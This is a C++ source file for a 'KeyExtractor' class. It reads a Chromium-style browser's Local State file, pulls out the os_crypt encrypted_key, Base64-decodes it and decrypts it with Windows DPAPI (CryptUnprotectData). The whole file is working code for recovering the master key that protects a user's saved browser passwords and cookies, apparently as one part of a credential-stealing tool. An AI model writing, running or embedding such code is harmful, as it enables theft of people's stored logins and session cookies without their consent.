#include "../include/KeyExtractorIncludes.h"
#include <iostream>
   


KeyExtractor::KeyExtractor(const std::string& localStateFilePath) : localStateFilePath(localStateFilePath) {
    std::cout << "[+] Initialiszing KeyExtractor with file path: " << localStateFilePath << std::endl;
}

std::vector<unsigned char> KeyExtractor::extractKey(){
    std::cout << "[+] Reading local state file..." << std::endl;
    std::string jsonData = readFile(localStateFilePath);
    std::cout << "[+] Parsing JSON data for encrypted key..." << std::endl;
    std::string encryptedKey = parseJsonForKey(jsonData);
    std::cout << "[+] Decrypting key..." << std::endl;
    return decryptKey(encryptedKey);
}

std::string KeyExtractor::readFile(const std::string& filePath) {
    std::string content;
    std::ifstream file(filePath);
    if(!file.is_open()) {
        throw std::runtime_error("Unable to open file: " + filePath);
    }
    content.assign(std::istreambuf_iterator<char>(file), std::istreambuf_iterator<char>());
    file.close();
    std::cout << "[+] File read successfully." << std::endl;
    return content;
}

std::vector<unsigned char> KeyExtractor::decryptKey(const std::string& encryptedKey) {
    std::cout << "[+] Decoding Base64 encoded key..." << std::endl;
    std::vector<unsigned char> decodedKey = decodeBase64(encryptedKey);
    DATA_BLOB encryptedBlob;
    encryptedBlob.cbData = static_cast<DWORD>(decodedKey.size());
    encryptedBlob.pbData = decodedKey.data();
    DATA_BLOB decryptedBlob = {0};
    if(CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0, &decryptedBlob)) {
        std::vector<unsigned char> decryptedKey(decryptedBlob.pbData, decryptedBlob.pbData + decryptedBlob.cbData);
        LocalFree(decryptedBlob.pbData);
        std::cout << "[+] Decryption successful." << std::endl;
        return decryptedKey;
    }else{
        throw std::runtime_error("Decryption failed");
    }
}

std::string KeyExtractor::parseJsonForKey(const std::string& jsonData){
    auto json = nlohmann::json::parse(jsonData);
    std::string encryptedKey = json["os_crypt"]["encrypted_key"];
    return encryptedKey;
}

std::vector<unsigned char> KeyExtractor::decodeBase64(const std::string& encoded){
    std::vector<unsigned char> decoded = cppcodec::base64_rfc4648::decode(encoded);
    return decoded;
}